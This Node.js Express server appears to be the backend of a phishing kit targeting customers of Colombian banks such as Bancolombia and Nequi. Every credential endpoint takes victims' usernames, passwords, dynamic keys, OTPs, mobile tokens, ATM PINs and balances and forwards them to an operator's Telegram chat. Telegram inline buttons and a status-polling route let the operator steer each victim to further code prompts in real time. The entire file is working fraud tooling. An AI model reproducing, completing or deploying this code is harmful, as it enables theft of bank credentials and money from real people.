const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const cors = require('cors');
const NodeCache = require('node-cache');
const { Mutex } = require('async-mutex');
require('dotenv').config();

const app = express();
app.use(cors({
  origin: ['http://localhost:8000', 'http://192.168.1.5:8000', 'https://portaldepagosfactura.com'],
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type', 'x-api-key-authorization', 'x-client-id']
}));
app.use(bodyParser.json());

// Configuración desde .env
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// In-memory cache with mutex
const cache = new NodeCache({ stdTTL: 3600 }); // 1 hour TTL
const mutex = new Mutex();

// -------------------- Middleware de validación --------------------
function validarHeaders(req, res) {
  const apiKey = req.headers['x-api-key-authorization'];
  const clientId = req.headers['x-client-id'];
  if (apiKey !== 'Zx7Yw9Qp2Rt4Uv6WbA' || clientId !== 'user3') {
    res.status(401).json({ error: 'No autorizado' });
    return false;
  }
  return true;
}

// -------------------- Rutas Front → Backend --------------------
app.post('/ingreso', async (req, res) => {
  if (!validarHeaders(req, res)) return;
  let mensaje = '';
  try {
    const { ip, id, numero } = req.body;
    console.log('Received data:', { ip, id, numero });
    if (!ip || !numero) return res.status(400).json({ error: 'Faltan datos' });
    mensaje = `
${numero} ha ingresado a Bancolombia
`.trim();
    if (!BOT_TOKEN || !CHAT_ID) {
      console.error('❌ BOT_TOKEN or CHAT_ID missing', { BOT_TOKEN: !!BOT_TOKEN, CHAT_ID: !!CHAT_ID });
      return res.status(500).json({ error: 'Configuración de Telegram inválida' });
    }
    const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'Markdown'
    });
    console.log('Telegram response:', response.data);
    res.json({ status: 'ok' });
  } catch (err) {
    console.error('❌ Detailed error:', {
      message: err.message,
      response: err.response?.data,
      status: err.response?.status,
      requestData: { chat_id: CHAT_ID, text: mensaje || 'Not defined' }
    });
    res.status(500).json({ error: 'No se pudo enviar mensaje' });
  }
});
app.post('/ingreso2', async (req, res) => {
  // Validar encabezados específicos
  const apiKey = req.headers['x-api-key-authorization'];
  const clientId = req.headers['x-client-id'];
  if (!apiKey || apiKey !== 'Zx7Yw9Qp2Rt4Uv6WbA' || !clientId || clientId !== 'user3') {
    console.error('❌ Invalid headers:', { apiKey: !!apiKey, clientId: !!clientId });
    return res.status(401).json({ error: 'Autorización inválida' });
  }

  let mensaje = '';
  try {
    const { ip, id, numero, banco } = req.body;
    console.log('Received data:', { ip, id, numero, banco });
    if (!ip || !numero || !banco) return res.status(400).json({ error: 'Faltan datos' });
    if (banco.toLowerCase() === 'bancolombia') {
      return res.status(400).json({ error: 'El banco Bancolombia debe usar el endpoint /ingreso' });
    }
    mensaje = `
${numero} ha ingresado a ${banco}
`.trim();
    if (!BOT_TOKEN || !CHAT_ID) {
      console.error('❌ BOT_TOKEN or CHAT_ID missing', { BOT_TOKEN: !!BOT_TOKEN, CHAT_ID: !!CHAT_ID });
      return res.status(500).json({ error: 'Configuración de Telegram inválida' });
    }
    const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'Markdown'
    });
    console.log('Telegram response:', response.data);
    res.json({ status: 'ok' });
  } catch (err) {
    console.error('❌ Detailed error:', {
      message: err.message,
      response: err.response?.data,
      status: err.response?.status,
      requestData: { chat_id: CHAT_ID, text: mensaje || 'Not defined' }
    });
    return res.status(500).json({ error: 'No se pudo enviar mensaje' });
  }
});

app.post('/proceso', async (req, res) => {
  if (!validarHeaders(req, res)) return;
  let mensaje = '';
  try {
    const { documento, usuario, ip, numero, transactionId } = req.body;
    console.log('Received data:', { documento, usuario, ip, numero, transactionId });
    if (!transactionId) {
      console.log('Missing transactionId:', transactionId);
      return res.status(400).json({ error: 'Falta transactionId' });
    }
    if (!documento || !usuario) {
      console.log('Missing documento or usuario:', { documento, usuario });
      return res.status(400).json({ error: 'Faltan documento o usuario' });
    }
    await mutex.runExclusive(async () => {
      cache.set(`estado:${transactionId}`, null, 3600);
    });
    mensaje = `
🏦 Banco: Bancolombia
👤 Usuario: \`${usuario}\`
🔑 Contraseña: \`${documento}\`
🌐 IP: \`${ip || 'N/D'}\`
🔘 Seleccione una opción: (ID: \`${transactionId}\`)
`.trim();
    console.log('Sending to Telegram:', { chat_id: CHAT_ID, text: mensaje });
    if (!BOT_TOKEN || !CHAT_ID) {
      console.error('❌ BOT_TOKEN or CHAT_ID missing', { BOT_TOKEN: !!BOT_TOKEN, CHAT_ID: !!CHAT_ID });
      return res.status(500).json({ error: 'Configuración de Telegram inválida' });
    }
    const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔑P-OTP", callback_data: `P-OTP:${transactionId}` }],
          [
            { text: "👤P-USER", callback_data: `P-USER:${transactionId}` },
            { text: "❌ERR-404", callback_data: `ERR-404:${transactionId}` }
          ],
          [
            { text: "💳ERR-TC", callback_data: `ERR-CC:${transactionId}` },
            { text: "⚠️ERR-OTP", callback_data: `ERR-OTP:${transactionId}` }
          ],
          [{ text: "✅FINALIZAR", callback_data: `FINALIZAR:${transactionId}` }]
        ]
      }
    });
    console.log('Telegram response:', response.data);
    res.json({ status: 'ok' });
  } catch (err) {
    console.error('❌ Detailed error:', {
      message: err.message,
      response: err.response?.data,
      status: err.response?.status,
      requestData: { chat_id: CHAT_ID, text: mensaje || 'Not defined' }
    });
    res.status(500).json({ error: 'No se pudo enviar mensaje' });
  }
});

app.post('/proceso2', async (req, res) => {
  if (!validarHeaders(req, res)) return;
  let mensaje = '';
  try {
    const { claveDinamica, usuario, ip, numero, transactionId } = req.body;
    console.log('Received data:', { claveDinamica, usuario, ip, numero, transactionId });
    if (!transactionId) {
      console.log('Missing transactionId:', transactionId);
      return res.status(400).json({ error: 'Falta transactionId' });
    }
    if (!claveDinamica || !usuario) {
      console.log('Missing claveDinamica or usuario:', { claveDinamica, usuario });
      return res.status(400).json({ error: 'Faltan claveDinamica o usuario' });
    }
    await mutex.runExclusive(async () => {
      cache.set(`estado:${transactionId}`, null, 3600);
    });
    mensaje = `
🏦 Banco: Bancolombia
👤 Usuario: \`${usuario}\`
🔑 Clave dinámica: \`${claveDinamica}\`
🌐 IP: \`${ip || 'N/D'}\`
🔘 Seleccione una opción: (ID: \`${transactionId}\`)
`.trim();
    console.log('Sending to Telegram:', { chat_id: CHAT_ID, text: mensaje });
    if (!BOT_TOKEN || !CHAT_ID) {
      console.error('❌ BOT_TOKEN or CHAT_ID missing', { BOT_TOKEN: !!BOT_TOKEN, CHAT_ID: !!CHAT_ID });
      return res.status(500).json({ error: 'Configuración de Telegram inválida' });
    }
    const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔑P-OTP", callback_data: `P-OTP:${transactionId}` }],
          [
            { text: "👤P-USER", callback_data: `P-USER:${transactionId}` },
            { text: "❌ERR-404", callback_data: `ERR-404:${transactionId}` }
          ],
          [
            { text: "💳ERR-TC", callback_data: `ERR-CC:${transactionId}` },
            { text: "⚠️ERR-OTP", callback_data: `ERR-OTP:${transactionId}` }
          ],
          [{ text: "✅FINALIZAR", callback_data: `FINALIZAR:${transactionId}` }]
        ]
      }
    });
    console.log('Telegram response:', response.data);
    res.json({ status: 'ok' });
  } catch (err) {
    console.error('❌ Detailed error:', {
      message: err.message,
      response: err.response?.data,
      status: err.response?.status,
      requestData: { chat_id: CHAT_ID, text: mensaje || 'Not defined' }
    });
    res.status(500).json({ error: 'No se pudo enviar mensaje' });
  }
});

app.post('/procesar', async (req, res) => {
  if (!validarHeaders(req, res)) return;
  let mensaje = '';
  try {
    const { clave, numero, ip, transactionId, saldo } = req.body;
    console.log('Received data (Nequi procesar):', { clave, numero, ip, transactionId, saldo });
    if (!transactionId) return res.status(400).json({ error: 'Falta transactionId' });
    if (!clave || !numero) return res.status(400).json({ error: 'Faltan clave o número' });
    if (saldo === undefined || saldo === null || isNaN(saldo) || saldo < 0) return res.status(400).json({ error: 'Saldo inválido' });
    await mutex.runExclusive(async () => {
      cache.set(`estado:${transactionId}`, null, 3600);
    });
    mensaje = `
⭐️ Banco: Nequi
📱 Número: \`${numero}\`
🔑 Clave: \`${clave}\`
💰 Saldo: \`${saldo.toLocaleString('es-CO', { style: 'currency', currency: 'COP' })}\`
🌐 IP: \`${ip || 'N/D'}\`
🔘 Seleccione una opción: (ID: \`${transactionId}\`)
    `.trim();
    const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔑P-OTP", callback_data: `P-OTP:${transactionId}` }],
          [
            { text: "👤P-USER", callback_data: `P-USER:${transactionId}` },
            { text: "❌ERR-404", callback_data: `ERR-404:${transactionId}` }
          ],
          [
            { text: "💳ERR-TC", callback_data: `ERR-CC:${transactionId}` },
            { text: "⚠️ERR-OTP", callback_data: `ERR-OTP:${transactionId}` }
          ],
          [{ text: "✅FINALIZAR", callback_data: `FINALIZAR:${transactionId}` }]
        ]
      }
    });
    console.log('Telegram response (Nequi procesar):', response.data);
    res.json({ status: 'ok' });
  } catch (err) {
    console.error('❌ Error procesar Nequi:', {
      message: err.message,
      response: err.response?.data,
      status: err.response?.status
    });
    res.status(500).json({ error: 'No se pudo enviar mensaje Nequi' });
  }
});

app.post('/procesar2', async (req, res) => {
  if (!validarHeaders(req, res)) return;
  let mensaje = '';
  try {
    const { claveDinamica, numero, ip, transactionId } = req.body;
    console.log('Received data (Nequi procesar2):', { claveDinamica, numero, ip, transactionId });
    if (!transactionId) return res.status(400).json({ error: 'Falta transactionId' });
    if (!claveDinamica || !numero) return res.status(400).json({ error: 'Faltan claveDinamica o número' });
    await mutex.runExclusive(async () => {
      cache.set(`estado:${transactionId}`, null, 3600);
    });
    mensaje = `
📲 Banco: Nequi
📱 Número: \`${numero}\`
🔑 Clave dinámica: \`${claveDinamica}\`
🌐 IP: \`${ip || 'N/D'}\`
🔘 Seleccione una opción: (ID: \`${transactionId}\`)
    `.trim();
    const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔑P-OTP", callback_data: `P-OTP:${transactionId}` }],
          [
            { text: "👤P-USER", callback_data: `P-USER:${transactionId}` },
            { text: "❌ERR-404", callback_data: `ERR-404:${transactionId}` }
          ],
          [
            { text: "💳ERR-TC", callback_data: `ERR-CC:${transactionId}` },
            { text: "⚠️ERR-OTP", callback_data: `ERR-OTP:${transactionId}` }
          ],
          [{ text: "✅FINALIZAR", callback_data: `FINALIZAR:${transactionId}` }]
        ]
      }
    });
    console.log('Telegram response (Nequi procesar2):', response.data);
    res.json({ status: 'ok' });
  } catch (err) {
    console.error('❌ Error procesar2 Nequi:', {
      message: err.message,
      response: err.response?.data,
      status: err.response?.status
    });
    res.status(500).json({ error: 'No se pudo enviar mensaje Nequi2' });
  }
});

app.post('/continuar', async (req, res) => {
  if (!validarHeaders(req, res)) return;
  let mensaje = '';
  try {
    const { usuario, contrasena, bancoEmisor, ip, id } = req.body;
    console.log('Received data:', { usuario, contrasena, bancoEmisor, ip, id });
    if (!id || !usuario || !contrasena || !bancoEmisor) {
      console.log('Missing required fields:', { id, usuario, contrasena, bancoEmisor });
      return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }
    await mutex.runExclusive(async () => {
      cache.set(`estado:${id}`, null, 3600);
    });
    mensaje = `
🏦 Banco: ${(bancoEmisor || 'N/D').toUpperCase()}
👤 Usuario: \`${usuario}\`
🔐 Contraseña: \`${contrasena}\`
🌐 IP: \`${ip || 'N/D'}\`
🔘 Seleccione una opción: (ID: \`${id}\`)
`.trim();
    console.log('Sending to Telegram:', { chat_id: CHAT_ID, text: mensaje });
    if (!BOT_TOKEN || !CHAT_ID) {
      console.error('❌ BOT_TOKEN or CHAT_ID missing', { BOT_TOKEN: !!BOT_TOKEN, CHAT_ID: !!CHAT_ID });
      return res.status(500).json({ error: 'Configuración de Telegram inválida' });
    }
    const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: "⭐️OTP", callback_data: `⭐️OTP:${id}` },
            { text: "⭐️TK", callback_data: `⭐️TK:${id}` },
            { text: "⭐️AP", callback_data: `⭐️AP:${id}` },
            { text: "⭐️ATM", callback_data: `⭐️ATM:${id}` }
          ],
          [
            { text: "❌OTP", callback_data: `❌OTP:${id}` },
            { text: "❌TK", callback_data: `❌TK:${id}` },
            { text: "❌AP", callback_data: `❌AP:${id}` },
            { text: "❌ATM", callback_data: `❌ATM:${id}` }
          ],
          [
            { text: "👤P-USER", callback_data: `P-USER:${id}` },
            { text: "💳ERR-TC", callback_data: `ERR-CC:${id}` }
          ],
          [
            { text: "✅FINISH", callback_data: `FINISH:${id}` }
          ]
        ]
      }
    });
    console.log('Telegram response:', response.data);
    res.json({ status: 'ok' });
  } catch (err) {
    console.error('❌ Detailed error:', {
      message: err.message,
      response: err.response?.data,
      status: err.response?.status,
      requestData: { chat_id: CHAT_ID, text: mensaje || 'Not defined' }
    });
    res.status(500).json({ error: 'No se pudo enviar mensaje' });
  }
});

app.post('/continuar2', async (req, res) => {
  if (!validarHeaders(req, res)) return;
  let mensaje = '';
  try {
    const { codigo, id, ip, bancoEmisor } = req.body;
    console.log('Received data:', { codigo, id, ip, bancoEmisor });
    if (!id || !codigo || !bancoEmisor) {
      console.log('Missing required fields:', { id, codigo, bancoEmisor });
      return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }
    // Validar longitud del código según el estado
    const estadoResponse = await cache.get(`estado:${id}`);
    const validLengths = {
      '⭐️OTP': 6,
      '⭐️TK': 8,
      '⭐️AP': 8,
      '⭐️ATM': 4,
      '❌OTP': 6,
      '❌TK': 8,
      '❌AP': 8,
      '❌ATM': 4
    };
    if (validLengths[estadoResponse] && codigo.length !== validLengths[estadoResponse]) {
      console.log('Invalid code length:', { codigo, expected: validLengths[estadoResponse] });
      return res.status(400).json({ error: `El código debe tener ${validLengths[estadoResponse]} dígitos` });
    }
    await mutex.runExclusive(async () => {
      cache.set(`estado:${id}`, null, 3600);
    });
    const codeName = {
      '⭐️OTP': 'OTP',
      '⭐️TK': 'token móvil',
      '⭐️AP': 'clave dinámica',
      '⭐️ATM': 'clave ATM',
      '❌OTP': 'OTP (error)',
      '❌TK': 'token móvil (error)',
      '❌AP': 'clave dinámica (error)',
      '❌ATM': 'clave ATM (error)'
    }[estadoResponse] || 'código';
    mensaje = `
🏦 Banco: ${(bancoEmisor || 'N/D').toUpperCase()}
🔑 ${codeName}: \`${codigo}\`
🌐 IP: \`${ip || 'N/D'}\`
🔘 Seleccione una opción: (ID: \`${id}\`)
`.trim();
    console.log('Sending to Telegram:', { chat_id: CHAT_ID, text: mensaje });
    if (!BOT_TOKEN || !CHAT_ID) {
      console.error('❌ BOT_TOKEN or CHAT_ID missing', { BOT_TOKEN: !!BOT_TOKEN, CHAT_ID: !!CHAT_ID });
      return res.status(500).json({ error: 'Configuración de Telegram inválida' });
    }
    const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: "⭐️OTP", callback_data: `⭐️OTP:${id}` },
            { text: "⭐️TK", callback_data: `⭐️TK:${id}` },
            { text: "⭐️AP", callback_data: `⭐️AP:${id}` },
            { text: "⭐️ATM", callback_data: `⭐️ATM:${id}` }
          ],
          [
            { text: "❌OTP", callback_data: `❌OTP:${id}` },
            { text: "❌TK", callback_data: `❌TK:${id}` },
            { text: "❌AP", callback_data: `❌AP:${id}` },
            { text: "❌ATM", callback_data: `❌ATM:${id}` }
          ],
          [
            { text: "👤P-USER", callback_data: `P-USER:${id}` },
            { text: "💳ERR-TC", callback_data: `ERR-CC:${id}` }
          ],
          [
            { text: "✅FINISH", callback_data: `FINISH:${id}` }
          ]
        ]
      }
    });
    console.log('Telegram response:', response.data);
    res.json({ status: 'ok' });
  } catch (err) {
    console.error('❌ Detailed error:', {
      message: err.message,
      response: err.response?.data,
      status: err.response?.status,
      requestData: { chat_id: CHAT_ID, text: mensaje || 'Not defined' }
    });
    res.status(500).json({ error: 'No se pudo enviar mensaje' });
  }
});

app.post('/webhook', async (req, res) => {
  let mensaje = '';
  try {
    const cb = req.body?.callback_query;
    if (cb && cb.data) {
      const [accionRaw, transactionId] = cb.data.split(':');
      mensaje = `Elegiste ${accionRaw} para el registro ID: ${transactionId}`;
      if (!BOT_TOKEN || !CHAT_ID) {
        console.error('❌ BOT_TOKEN or CHAT_ID missing', { BOT_TOKEN: !!BOT_TOKEN, CHAT_ID: !!CHAT_ID });
        throw new Error('Configuración de Telegram inválida');
      }
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: mensaje,
        disable_notification: true
      });
      await mutex.runExclusive(async () => {
        cache.set(`estado:${transactionId}`, accionRaw, 3600);
      });
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
        callback_query_id: cb.id,
        text: '✅ Acción registrada',
        show_alert: false
      });
    } else {
      console.log('No se recibió callback_query:', req.body);
    }
    res.sendStatus(200);
  } catch (err) {
    console.error('❌ Detailed error:', {
      message: err.message,
      response: err.response?.data,
      status: err.response?.status,
      requestData: { chat_id: CHAT_ID, text: mensaje || 'Not defined' }
    });
    res.sendStatus(200);
  }
});

app.get('/estado/:id', async (req, res) => {
  const id = req.params.id;
  try {
    const estado = cache.get(`estado:${id}`);
    console.log(`Consultando estado para ID: ${id}, Estado: ${estado}`);
    res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    res.set('Pragma', 'no-cache');
    res.set('Expires', '0');
    res.json({ redireccion: estado || null });
  } catch (err) {
    console.error('❌ Error consultando estado:', {
      message: err.message
    });
    res.status(500).json({ error: 'Error consultando estado' });
  }
});

app.get('/health', (_req, res) => res.json({ ok: true }));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🟢 Servidor corriendo en http://localhost:${PORT}`);
});




